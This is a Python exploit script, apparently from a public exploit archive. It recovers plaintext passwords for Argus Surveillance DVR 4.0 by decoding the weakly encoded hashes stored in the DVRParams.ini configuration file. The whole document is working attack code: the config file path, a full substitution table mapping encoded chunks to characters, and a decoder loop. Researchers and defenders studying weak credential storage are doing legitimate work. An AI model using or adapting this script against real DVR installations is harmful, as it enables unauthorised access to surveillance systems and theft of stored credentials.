# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
# Exploit Author: Ryan Thompson (@sidejackthenativity) based on work by Salman Asad (@deathflash1411) a.k.a LeoBreaker
# This Exploit adds special characters to the encryption dictionary
# Date: 09.23.2022
# Version: Argus Surveillance DVR 4.0
# Tested on: Windows 7 x86 (Build 7601) & Windows 10
# Reference: https://github.com/sidejackthenativity/dvr4-hash-crack-with-specials

# Note: Argus Surveillance DVR 4.0 configuration is present in
# C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

characters = {
'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
'8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
'7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
'8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
'906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
'7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z',
'B398':'!','AF71':'~','78A7':'@','D9A8':'$','30F6':'%',
'F7DF':'^','F79A':'*','D474':'(','4BEE':')','3B76':'-',
'ECEC':'_','7359':'+','A638':'=','6889':'{','B352':'}',
'C98C':']','6CF7':'[','6248':'|','A1F8':'\\','E06F':'`',
'44C4':',','3E84':'.','76D0':'/','57E5':'?','D8F2':';',
'D885':':','DB5F':'<','F8C7':'>'}


banner = '''
############################################################################################
#        							  Surveillance DVR 4.0                 				   #
#																						   #
#    _____                                 _________                    .__       .__      #
#   /  _  \_______  ____  __ __  ______   /   _____/_____   ____   ____ |__|____  |  |     #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/   \_____  \\____ \_/ __ \_/ ___\|  \__  \ |  |     #
# /    |    \  | \/ /_/  >  |  /\___ \    /        \  |_> >  ___/\  \___|  |/ __ \|  |__   #
# \____|__  /__|  \___  /|____//____  >  /_______  /   __/ \___  >\___  >__(____  /____/   #
#         \/     /_____/            \/           \/|__|        \/     \/        \/         #
#																						   #
#        							Weak Password Encryption      		  				   #
#############################   based on @deathflash1411 work ##############################
'''
print(banner)

# Change this :)
pass_hash = "REPLACEMEWITHHASHFROM DVRParams.ini"
if (len(pass_hash)%4) != 0:
	print("[!] Error, check your password hash")
	exit()
split = []
n = 4
for index in range(0, len(pass_hash), n):
	split.append(pass_hash[index : index + n])

for key in split:
	if key in characters.keys():
		print("[+] " + key + ":" + characters[key])
	else:
		print("[-] " + key + ":Unknown")
